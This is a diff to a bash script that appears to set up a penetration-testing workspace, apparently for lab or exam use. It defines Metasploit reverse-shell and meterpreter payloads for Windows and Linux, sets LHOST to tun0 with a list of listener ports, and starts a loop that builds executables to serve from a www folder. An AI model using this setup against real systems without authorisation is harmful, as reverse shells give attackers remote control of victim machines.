@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # create folder structure
-mkdir -p exploits www notes logs artefacts
+mkdir -p exploits www notes logs artefacts share
 echo "[+] All folders created."
 
 # create files
@@ -14,7 +14,11 @@ echo "[+] www/index.md created."
 # create payloads
 LHOST="tun0"
 PORTS=(80 443 4444 5555 6666 7777 8888)
-PAYLOAD_WIN="windows/x64/shell/reverse_tcp"
+PAYLOAD_WIN="windows/x64/shell/reverse_tcp" # old
+#PAYLOAD_WIN="windows/x64/powershell_reverse_tcp"
+#PAYLOAD_WIN="windows/x64/meterpreter_reverse_https"
+#PAYLOAD_WIN="windows/x64/powershell_reverse_tcp"
+
 PAYLOAD_LIN="linux/x64/shell_reverse_tcp "
 for PORT in "${PORTS[@]}"; do
     OUTPUT_WIN="www/rs_${PORT}.exe"
